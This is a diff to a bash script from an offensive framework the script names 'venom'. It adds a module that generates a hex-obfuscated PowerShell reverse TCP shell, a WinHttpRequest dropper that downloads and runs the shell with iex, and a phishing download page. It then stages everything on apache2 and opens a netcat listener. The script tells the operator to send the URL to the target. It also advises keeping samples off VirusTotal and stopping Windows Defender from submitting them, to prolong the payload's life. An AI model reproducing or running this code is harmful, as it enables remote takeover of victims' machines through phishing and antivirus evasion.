@@ -11943,6 +11943,14 @@ cat << !
     | AGENT EXTENSION    : PS1
     |_DROPPER EXTENSION  : PS1
 
+    AGENT Nº3
+    ╔──────────────────────────────────────────────────────────────
+    | DESCRIPTION        : Reverse Powershell Shell (hex obfuscation)
+    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
+    | LOLBin             : WinHttpRequest
+    | AGENT EXTENSION    : PS1
+    |_DROPPER EXTENSION  : PS1
+
     ╔─────────────────────────────────────────────────────────────╗
     ║   M    - Return to main menu                                ║
     ║   E    - Exit venom Framework                               ║
@@ -12235,9 +12243,119 @@ sh_menu
 
 
 
-
-
+# ----------------------------------------------
+# Reverse TCP Powershell Shell (hex obfuscation)
+# ----------------------------------------------
 sh_evasion3 () {
+Colors;
+
+## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
+echo "---"
+echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "- Please Dont test samples on Virus Total or on similar"${Reset};
+echo "- online scanners, because that will shorten the payload life."${Reset};
+echo "- And in testings also remmenber to stop the windows defender"${Reset};
+echo "- from sending samples to \$Microsoft.. (just in case)."${Reset};
+echo "---"
+sleep 2
+
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: downloader" --entry --width 300) > /dev/null 2>&1
+NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Obfrevshell" --entry --width 300) > /dev/null 2>&1
+
+## setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$Drop" ]; then Drop="dropper";fi
+if [ -z "$NaM" ]; then NaM="Obfrevshell";fi
+
+# display final settings to user
+echo "${BlueF}[${YellowF}i${BlueF}]${white} MODULE SETTINGS"${Reset};
+echo ${BlueF}"---"
+cat << !
+    LPORT    : $lport
+    LHOST    : $lhost
+    LOLBin   : WinHttpRequest
+    DROPPER  : $IPATH/output/$Drop.ps1
+    AGENT    : $IPATH/output/$NaM.ps1
+!
+echo "---"
+
+
+## BUILD DROPPER
+echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
+echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
+
+
+## Convert ip addr to hex
+echo "${BlueF}[☠]${white} Converting ip addr to hex ..${white}";sleep 2
+one=$(echo $lhost|cut -d '.' -f1)
+two=$(echo $lhost|cut -d '.' -f2)
+tre=$(echo $lhost|cut -d '.' -f3)
+four=$(echo $lhost|cut -d '.' -f4)
+Hex=$(printf "%x,%x,%x,%x\n" $one $two $tre $four)
+um=$(echo $Hex|cut -d ',' -f1)
+dois=$(echo $Hex|cut -d ',' -f2)
+tres=$(echo $Hex|cut -d ',' -f3)
+quato=$(echo $Hex|cut -d ',' -f4)
+strip="\"$um\"","\"$dois\"","\"$tres\"","\"$quato\"";hexed=$strip
+echo "${BlueF}[☠]${white} Obfuscated ip (hex):${GreenF}$hexed ${white}";sleep 2
+
+
+## Build Reverse Powershell Shell (obfuscated)
+echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\$_,16) }) -join '.';\$w = \"GET /index.html HTTP/1.1\`r\`nHost: \$p\`r\`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\`r\`nAccept: text/html\`r\`n\`r\`n\";\$s = [System.Text.ASCIIEncoding];[byte[]]\$b = 0..65535|%{0};\$x = \"n-eiorvsxpk5\";Set-alias \$x (\$x[\$true-10] + (\$x[[byte](\"0x\" + \"FF\") - 265]) + \$x[[byte](\"0x\" + \"9a\") - 158]);\$y = New-Object System.Net.Sockets.TCPClient(\$p,$lport);\$z = \$y.GetStream();\$d = \$s::UTF8.GetBytes(\$w);\$z.Write(\$d, 0, \$d.Length);\$t = (n-eiorvsxpk5 whoami) + \"$ \";while((\$l = \$z.Read(\$b, 0, \$b.Length)) -ne 0){;\$v = (New-Object -TypeName \$s).GetString(\$b,0, \$l);\$d = \$s::UTF8.GetBytes((n-eiorvsxpk5 \$v 2>&1 | Out-String )) + \$s::UTF8.GetBytes(\$t);\$z.Write(\$d, 0, \$d.Length);}\$y.Close();Start-Sleep -Seconds 5}" > $IPATH/output/$NaM.ps1
+
+
+## Building Phishing webpage
+cd $IPATH/templates/phishing
+echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
+sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
+mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
+cd $IPATH
+
+
+## Copy files to apache2 webroot
+cd $IPATH/output
+zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1
+echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
+cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
+cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
+cd $IPATH
+
+
+## Print attack vector on terminal
+echo "${BlueF}[${GreenF}✔${BlueF}]${white} Starting apache2 webserver ..";sleep 2
+echo "${BlueF}---"
+echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
+echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
+echo "${BlueF}---"${Reset};
+echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
+read odf
+rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
+## START HANDLER
+cd $IPATH/output
+xterm -T " NETCAT LISTENER- $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"
+cd $IPATH
+sleep 2
+
+
+## Clean old files
+echo "${BlueF}[☠]${white} Please Wait,cleaning old files ..${white}";sleep 2
+rm $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
+rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
+rm $ApAcHe/mega1.html > /dev/nul 2>&1
+rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
+sh_menu
+}
+
+
+
+
+
+
+
+sh_evasion4 () {
 Colors;
 
 ## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
